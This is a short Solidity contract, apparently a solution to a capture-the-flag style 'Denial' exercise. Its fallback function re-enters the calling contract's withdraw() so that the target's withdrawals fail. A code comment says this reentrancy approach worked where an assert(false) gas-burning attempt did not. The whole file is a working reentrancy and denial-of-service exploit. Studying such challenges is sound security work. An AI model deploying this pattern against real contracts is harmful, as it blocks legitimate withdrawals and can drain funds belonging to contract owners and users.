pragma solidity ^0.8.4;

interface IDenial {
    function withdraw() external; 
}

contract DenialProxy {
    fallback() external payable {
        /*
         * I tried assert(false) to consume all gas. 
         * However, it did not work and I don't know why.
         * The re-enterancy solution worked well.
         */

        IDenial target = IDenial(address(msg.sender));
        target.withdraw();
    }
}